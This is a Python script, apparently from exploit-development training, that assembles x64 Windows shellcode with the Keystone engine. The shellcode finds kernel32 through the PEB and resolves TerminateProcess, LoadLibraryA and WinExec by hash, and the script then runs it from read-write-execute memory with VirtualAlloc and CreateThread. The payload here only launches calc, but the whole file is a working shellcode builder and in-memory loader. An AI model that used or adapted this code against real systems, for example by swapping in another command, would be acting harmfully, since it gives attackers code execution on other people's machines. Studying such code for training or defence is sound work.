import ctypes, struct
from keystone import *
import binascii

CODE = (
    " start:                            "  #
    #"   int3                           ;" #   Breakpoint for Windbg. REMOVE ME WHEN NOT DEBUGGING!!!!
    "   AND   RSP,-0x10                 ;" # make sure stack is aligned to 16 bytes
    "   MOV   RBP, RSP                  ;"  #
    "   sub   RSP,0x50                  ;" # shift stack back 0x40
    

    " find_kernel32:                     "  #
    "   xor   RCX, RCX                  ;"
    "   xor   RDX, RDX                  ;"  #   ECX = 0
    "   mov   RDX, GS:[RDX + 0x60]      ;"  #   RDX = &(PEB) ([FS:0x30])
    "   mov   RDX, [RDX + 0x18]         ;"  #   EDX = PEB->Ldr
    "   mov   RSI, [RDX + 0x30]         ;"  #   RSI = PEB->Ldr.InInitOrder

    " next_module:                       "  #
    "   mov   RDX, [RSI+0x10]           ;"  #   RDX = InInitOrder[X].base_address
    "   mov   r11, [RSI+0x40]           ;"  #   R11 = InInitOrder[X].module_name
    "   mov   RSI, [RSI]                ;"  #   RSI = InInitOrder[X].flink (next)
    "   cmp   [r11+12*2], cx            ;"  #   (unicode) modulename[12] == 0x00 ? kernel32.dll -> 12 char
    "   jne   next_module               ;"  #   No: try next module

    " find_function_shorten:             "  #
    "   jmp find_function_shorten_bnc   ;"  #   Short jump

    " find_function_ret:                 "  #
    "   pop   r15                       ;"  #   POP the return address from the stack
    "   jmp resolve_symbols_kernel32    ;"  #

    " find_function_shorten_bnc:         "  #   
    "   call find_function_ret          ;"  #   Relative CALL with negative offset

    " find_function:                     "  #
    "   PUSH   R9                       ;"  # save volitalte registers
    "   PUSH   R8                       ;"  
    "   PUSH   RDX                      ;"
    "   PUSH   RCX                      ;"
    "   PUSH   RSI                      ;" 
    "   xor   rcx, rcx                  ;"
    "   mov   EAX, [RDX+0x3c]           ;"  #   Offset to PE Signature
    "   add   RAX, RDX                  ;"
    "   add   cl, 0x88                  ;"
    "   mov   EAX, [RAX+rcx]            ;"  #   Export Table Directory RVA
    "   add   RAX, RDX                  ;"  #   Export Table Directory VMA
    "   push   RAX                      ;"
    "   mov   ECX, [RAX+0x18]           ;"  #   NumberOfNames
    "   mov   R8D, [RAX+0x20]           ;"  #   AddressOfNames RVA
    "   add   R8, RDX                   ;"  #   AddressOfNames VMA

    " find_function_loop:                "  #
    "   jecxz find_function_finished    ;"  #   Jump to the end if ECX is 0
    "   dec   RCX                       ;"  #   Decrement our names counter
    "   mov   ESI, [R8 + RCX *0x4]      ;"  #   Get the RVA of the symbol name
    "   add   RSI, RDX                  ;"  #   Set ESI to the VMA of the current symbol name

    " compute_hash:                      "  #
    "   xor   RAX, RAX                  ;"  #   NULL EAX
    "   xor R9, R9                      ;"
    "   cld                             ;"  #   Clear direction

    " compute_hash_again:                "  #
    "   lodsb                           ;"  #   Load the next byte from esi into al
    "   test  al, al                    ;"  #   Check for NULL terminator
    "   jz    compute_hash_finished     ;"  #   If the ZF is set, we've hit the NULL term
    "   ror   R9D, 0x0d                 ;"  #   Rotate edx 13 bits to the right
    "   add   R9D, EAX                  ;"  #   Add the new byte to the accumulator
    "   jmp   compute_hash_again        ;"  #   Next iteration

    " compute_hash_finished:             "  #

    " find_function_compare:             "  #
    "   cmp   r9d, r10d                 ;"  #   Compare the computed hash with the requested hash
    "   jnz   find_function_loop        ;"  #   If it doesn't match go back to find_function_loop
    "   POP   RAX                       ;"
    "   mov   R8D, [RAX+0x24]           ;"  #   AddressOfNameOrdinals RVA
    "   add   R8, RDX                   ;"  #   AddressOfNameOrdinals VMA
    "   mov   cx,  [R8+RCX*0x2]         ;"  #   Extrapolate the function's ordinal
    "   mov   r8d, [RAX+0x1c]           ;"  #   AddressOfFunctions RVA
    "   add   r8, RDX                   ;"  #   AddressOfFunctions VMA
    "   mov   eax, [r8+RCX*0x4]         ;"  #   Get the function RVA
    "   add   RAX, RDX                  ;"  #   Get the function VMA
  
    " find_function_finished:             "
    "   POP   RSI                       ;"
    "   POP   RCX                       ;"
    "   POP   RDX                       ;"
    "   POP   R8                        ;"
    "   POP   R9                        ;"
    "   ret                             ;" # pop return address off stack, RAX = function address

    " resolve_symbols_kernel32:          "
    "   mov   r10d, 0x78b5b983          ;"  #   TerminateProcess hash
    "   call   r15                      ;"  #   Call find_function
    "   mov   [rbp+0x8], rax            ;"  #   
    "   mov   r10d, 0xec0e4e8e          ;"  #   LoadLibraryA hash
    "   call   r15                      ;"  #   Call find_function
    "   mov   [rbp+0x10], rax           ;"  #   Save LoadLibraryA address for later usage
    "   mov r10d, 0x0E8AFE98            ;"
    "   call r15                        ;"
    "   mov [rbp+0x18], rax             ;"  # WinExec

    " call_winexec:                     "
    "   xor rdx, rdx                    ;"
    "   inc rdx                         ;" # uCmdShow = SW_SHOWNORMAL
    "   xor rcx, rcx                    ;"
    "   mov ecx, 0x636c6163             ;" # "calc"[::-1].encode('utf-8').hex()
    "   push rcx                        ;" # extra push for stack alignment
    "   push rcx                        ;"
    "   mov rcx, rsp                    ;"
    "   sub rsp, 0x20                   ;"
    "   call qword ptr [rbp+0x18]       ;" # call WinExec
    "   add rsp, 0x20                   ;"

    " call_terminateprocess:              "
    "   xor   rcx,rcx                    ;"
    "   dec   rcx                        ;"
    "   xor   rdx, rdx                   ;"
    "   call   qword ptr [rbp+0x08]      ;"

)


# Initialize engine in X86-64bit mode
ks = Ks(KS_ARCH_X86, KS_MODE_64)
encoding, count = ks.asm(CODE)
print("Encoded %d instructions..." % count)

sh = b""
for e in encoding:
    sh += struct.pack("B", e)
shellcode = bytearray(sh)

with open('shellcode.bin', 'wb') as f: 
    f.write(shellcode)

ctypes.windll.kernel32.VirtualAlloc.restype = ctypes.c_void_p
ptr = ctypes.windll.kernel32.VirtualAlloc(ctypes.c_int(0),
                                          ctypes.c_int(len(shellcode)),
                                          ctypes.c_int(0x3000),
                                          ctypes.c_int(0x40))

buf = (ctypes.c_char * len(shellcode)).from_buffer(shellcode)

ctypes.windll.kernel32.RtlMoveMemory(ctypes.c_void_p(ptr),
                                     buf,
                                     ctypes.c_int(len(shellcode)))

print("Shellcode located at address %s" % hex(ptr))
input("...ENTER TO EXECUTE SHELLCODE...")

ht = ctypes.windll.kernel32.CreateThread(ctypes.c_int(0),
                                         ctypes.c_int(0),
                                         ctypes.c_void_p(ptr),
                                         ctypes.c_int(0),
                                         ctypes.c_int(0),
                                         ctypes.pointer(ctypes.c_int(0)))

ctypes.windll.kernel32.WaitForSingleObject(ctypes.c_int(ht), ctypes.c_int(-1))
